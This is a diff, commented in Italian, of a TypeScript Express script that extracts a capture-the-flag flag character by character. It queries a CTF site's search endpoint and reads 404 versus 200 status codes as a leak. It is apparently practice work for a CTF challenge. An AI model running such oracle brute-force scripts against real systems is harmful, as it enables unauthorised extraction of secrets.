@@ -7,70 +7,81 @@ const PORT = 3000;
 const charset =
 	"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_";
 let flag = "flag{";
-let index = 0;
 
-const checkCharacter = async (character: string): Promise<boolean> => {
+// Funzione per attendere un determinato numero di millisecondi
+const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+
+// Funzione per controllare se una stringa è la flag corretta
+const checkFlag = async (testFlag: string): Promise<boolean> => {
 	try {
 		const response = await axios.get(
-			`https://matrix.capturetheflags.site/search?s=${flag + character}`
+			`https://matrix-simplified.capturetheflags.site/search?s=${testFlag}`,
+			{
+				validateStatus: function (status) {
+					return status === 200 || status === 404;
+				},
+			}
 		);
-		return response.status === 200;
+
+		// Se riceviamo un 404, significa che la stringa non è stata trovata
+		// Questo è ciò che vogliamo per i tentativi errati
+		return response.status === 404;
 	} catch (error) {
-		if (axios.isAxiosError(error) && error.response) {
-			return error.response.status === 404;
-		}
-		console.error("Errore inaspettato:", error);
+		console.error(`Errore durante la richiesta: ${error}`);
 		return false;
 	}
 };
 
-const testNextCharacter = async (): Promise<void> => {
-	if (flag.endsWith("}")) {
-		console.log(`Flag completa trovata: ${flag}`);
-		return;
+const findFlag = async () => {
+	let currentFlag = flag;
+	let found = false;
+
+	while (!found) {
+		let charFound = false;
+
+		// Prova ogni carattere possibile
+		for (const char of charset) {
+			const testFlag = currentFlag + char;
+
+			console.log(`Tentativo con: ${testFlag}`);
+			await delay(100); // Aggiungi un ritardo per non sovraccaricare il server
+
+			const isCorrect = await checkFlag(testFlag);
+
+			if (isCorrect) {
+				currentFlag = testFlag;
+				charFound = true;
+				console.log(`Carattere trovato! Flag parziale: ${currentFlag}`);
+				break;
+			}
+		}
+
+		// Se non troviamo nessun carattere valido, proviamo a chiudere la flag
+		if (!charFound) {
+			const finalFlag = currentFlag + "}";
+			const isComplete = await checkFlag(finalFlag);
+
+			if (isComplete) {
+				currentFlag = finalFlag;
+				found = true;
+				console.log(`Flag completa trovata: ${currentFlag}`);
+			} else {
+				console.log(
+					"Nessun carattere valido trovato e non possiamo chiudere la flag"
+				);
+				break;
+			}
+		}
 	}
 
-	// Se abbiamo una stringa completa senza errori, possiamo aggiungere il carattere di chiusura
-	if (flag.length > 5 && (await checkCharacter("}"))) {
-		flag += "}";
-		console.log(`Flag completa trovata: ${flag}`);
-		return;
-	}
-
-	const character = charset[index];
-
-	if (!character) {
-		console.log("Errore: Nessun carattere trovato!");
-		return;
-	}
-
-	const isCorrect = await checkCharacter(character);
-
-	if (isCorrect) {
-		flag += character;
-		index = 0; // Reset dell'indice per il prossimo carattere
-		console.log(
-			`Carattere corretto trovato: ${character} - Flag parziale: ${flag}`
-		);
-	} else {
-		index++; // Passa al prossimo carattere
-	}
-
-	testNextCharacter();
+	return currentFlag;
 };
 
-app.get("/", (req, res) => {
-	console.log("🛒 GET: This request was made by the Architect 🧑‍💼!");
-	res.send("Hello Architect!");
-});
+app.get("/", async (req, res) => {
+	console.log(`Richiesta ricevuta da ${req.ip}`);
 
-app.post("/", (req, res) => {
-	console.log("⬆️ POST: Questa richiesta è stata fatta dall'Architetto 🧑‍💼!");
-
-	// Avvia la ricerca della flag quando l'architetto fa una richiesta POST
-	testNextCharacter();
-
-	res.sendStatus(200);
+	const result = await findFlag();
+	res.send(`Flag trovata: ${result}`);
 });
 
 app.listen(PORT, () => {
